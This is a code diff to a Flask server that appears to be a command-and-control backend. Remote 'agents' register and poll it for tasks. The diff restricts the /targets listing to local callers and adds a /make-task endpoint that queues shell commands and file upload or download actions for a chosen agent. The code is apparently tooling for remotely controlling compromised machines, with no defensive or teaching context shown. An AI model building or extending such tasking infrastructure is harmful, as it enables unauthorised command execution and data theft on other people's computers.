@@ -89,14 +89,6 @@ def register_agent():
             return jsonify({"message": "Agent registration renewed"}), 200
     return jsonify({"error": "Invalid data"}), 400
 
-@app.route('/targets', methods=['GET'])
-def get_targets():
-    targets = ""
-    agents = Agent.query.filter_by(targeted=True).all()
-    for agent in agents:
-        targets += agent.agent_id + "\n"
-    return targets
-
 @app.route('/results', methods=['POST'])
 def submit_results():
     try:
@@ -141,7 +133,7 @@ def get_task():
                 'task_id': task.id
             }
             return jsonify(task_data)
-    return jsonify({'action': 'NULL'})
+    return "NULL"
 
 
 
@@ -152,6 +144,15 @@ def get_agents():
     agents = Agent.query.all()
     agents = [{"agent_id": agent.agent_id, "status": agent.status} for agent in agents]
     return jsonify(agents)
+
+@app.route('/targets', methods=['GET'])
+@restrict_remote
+def get_targets():
+    targets = ""
+    agents = Agent.query.filter_by(targeted=True).all()
+    for agent in agents:
+        targets += agent.agent_id + "\n"
+    return targets
 
 @app.route('/set-targets', methods=['POST'])
 @restrict_remote
@@ -189,6 +190,28 @@ def clear_targets():
         agent.targeted = False
     db.session.commit()
     return jsonify({"message": "Targets cleared successfully"}), 200
+
+@app.route('/make-task', methods=['POST'])
+@restrict_remote
+def make_task():
+    data = request.json
+    agent_id = data.get('agent_id')
+    action = data.get('action')
+    command = data.get('command')
+    if data['action'] == "command":
+        command = data.get('command')
+    else:
+        command = "NULL"
+    if data['action'] == "download" or data['action'] == "upload":
+        filename = data.get('filename')
+    else:
+        filename = "NULL"
+    if agent_id and action:
+        new_task = Task(agent_id=agent_id, action=action, command=command, filename=filename)
+        db.session.add(new_task)
+        db.session.commit()
+        return jsonify({"message": "Task created successfully"}), 201
+    return jsonify({"error": "Invalid data"}), 400
     
 
 
